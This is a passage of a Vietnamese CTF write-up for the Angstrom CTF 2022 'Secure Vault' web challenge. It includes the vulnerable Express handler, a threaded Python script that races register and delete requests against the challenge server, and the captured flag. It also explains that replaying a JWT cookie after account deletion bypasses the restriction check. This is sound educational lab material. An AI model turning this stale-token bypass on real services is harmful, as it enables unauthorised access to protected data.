+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&quot;/vault&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="comment">// Lúc này res.locals.user vẫn còn trên server</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!res.locals.user) &#123;</span><br><span class="line">        res.status(<span class="number">401</span>).send(<span class="string">&quot;Log in first&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Nhưng tại đây /delete được query đến và res.locals.user bị xóa khỏi server?</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> user = users.get(res.locals.user.uid);</span><br><span class="line">    res.type(<span class="string">&quot;text/plain&quot;</span>).send(user.restricted ? user.vault : flag);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/06/Angstrom-CTF-2022/pikachu.jpg"></p>
+<p>Thì lúc đó <code>user</code> sẽ nhận giá trị rỗng <code>&#123;&#125;</code> và đoạn check phía dưới kiểm tra biến <code>user.restricted</code> có ổn không nhưng vì nó không tồn tại nên do đó flag sẽ được đẩy ra. Mình có thể kiểm chứng bằng console trên trình duyệt:</p>
+<p><img src="/2022/05/06/Angstrom-CTF-2022/console.png"></p>
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Dựa vào ý tưởng trên, việc của mình cần làm bây giờ là spam request liên tục vào <code>/register</code> rồi đến <code>/delete</code> và hy vọng điều kỳ diệu sẽ xảy ra.</p>
+<p>Hola, đây là script của mình:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">chars = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;https://secure-vault.web.actf.co/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">	s = requests.Session()</span><br><span class="line">	random_str = <span class="string">&#x27;&#x27;</span>.join(random.choices(chars, k=<span class="number">6</span>))</span><br><span class="line">	s.post(URL + <span class="string">&#x27;register&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: random_str, <span class="string">&#x27;password&#x27;</span>: random_str&#125;)</span><br><span class="line">	<span class="keyword">return</span> s.cookies.get_dict()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>(<span class="params">cookies</span>):</span></span><br><span class="line">	s = requests.Session()</span><br><span class="line">	r = s.get(URL + <span class="string">&#x27;vault&#x27;</span>, cookies=cookies)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># if &#x27;actf&#123;&#x27; in r.text:</span></span><br><span class="line">	<span class="comment"># 	with open(&#x27;flag.txt&#x27;, &#x27;w&#x27;) as f:</span></span><br><span class="line">	<span class="comment"># 		f.write(r.text)</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">cookies</span>):</span></span><br><span class="line">	s = requests.Session()</span><br><span class="line">	s.post(URL + <span class="string">&#x27;delete&#x27;</span>, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line">	cookies = register()</span><br><span class="line">	t1 = threading.Thread(target=get_flag, args=(cookies, ))</span><br><span class="line">	t2 = threading.Thread(target=delete, args=(cookies, ))</span><br><span class="line">	t1.start()</span><br><span class="line">	t2.start()</span><br></pre></td></tr></table></figure>
+
+<p>Flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;is_this_what_uaf_is&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="O-nhung-tai-sao-flag-la-actf-is-this-what-uaf-is-chu-khong-phai-actf-is-this-what-race-condition-is"><a href="#O-nhung-tai-sao-flag-la-actf-is-this-what-uaf-is-chu-khong-phai-actf-is-this-what-race-condition-is" class="headerlink" title="Ơ nhưng tại sao flag là actf{is_this_what_uaf_is} chứ không phải actf{is_this_what_race_condition_is}?"></a>Ơ nhưng tại sao flag là actf{is_this_what_uaf_is} chứ không phải actf{is_this_what_race_condition_is}?</h2><p>Sau khi nhìn vào flag và đọc lại source để tìm hiểu tại sao thì mình nhận ra nó không quá khó như vậy :)  </p>
+<p><code>user</code> ở đây được lấy từ JWT trong cookie ra chứ không phải lấy từ database trong server. Do đó nếu như mình vẫn còn giữ cookie sau khi gọi <code>/delete</code> thì <code>uid</code> của <code>res.locals.user</code> vẫn còn nhưng giá trị khi gọi hàm <code>users.get(res.locals.user.uid)</code> thì không.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        res.locals.user = jwt.verify(req.cookies.token, jwtKey, &#123;</span><br><span class="line">            <span class="attr">algorithms</span>: [<span class="string">&quot;HS256&quot;</span>],</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.cookies.token) &#123;</span><br><span class="line">            res.clearCookie(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>Mình chỉ cần lưu lại cookie sau khi <code>/register</code> rồi bấm <code>/delete</code>, sau đó gán lại cookie vào trình duyệt và đi tới <code>/vault</code> để có flag.  </p>
+<p>Tuy không cần dùng tới Race condition nhưng kỹ thuật này khá là hay và thường được sử dụng khi gặp các chall mà server có database,… shoặc vân vân và mây mây.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#School-Unblocker"><span class="toc-number">1.</span> <span class="toc-text">School Unblocker</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-started"><span class="toc-number">1.1.</span> <span class="toc-text">Getting started</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dig-proxy"><span class="toc-number">1.2.</span> <span class="toc-text">$ dig &#x2F;proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ua-vay-DNS-Rebinding-la-cai-gi"><span class="toc-number">1.3.</span> <span class="toc-text">Ủa, vậy DNS Rebinding là cái gì? :)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.4.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Secure-Vault"><span class="toc-number">2.</span> <span class="toc-text">Secure Vault</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-stared"><span class="toc-number">2.1.</span> <span class="toc-text">Getting stared</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bug-dau"><span class="toc-number">2.2.</span> <span class="toc-text">Bug đâu?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Truong-hop-dua"><span class="toc-number">2.3.</span> <span class="toc-text">Trường hợp đua</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.4.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#O-nhung-tai-sao-flag-la-actf-is-this-what-uaf-is-chu-khong-phai-actf-is-this-what-race-condition-is"><span class="toc-number">2.5.</span> <span class="toc-text">Ơ nhưng tại sao flag là actf{is_this_what_uaf_is} chứ không phải actf{is_this_what_race_condition_is}?</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&text=Angstrom-CTF-2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&is_video=false&description=Angstrom-CTF-2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Angstrom-CTF-2022&body=Check out this article: https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&name=Angstrom-CTF-2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&t=Angstrom-CTF-2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Wのﾑ刀ﾶ乇の11
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
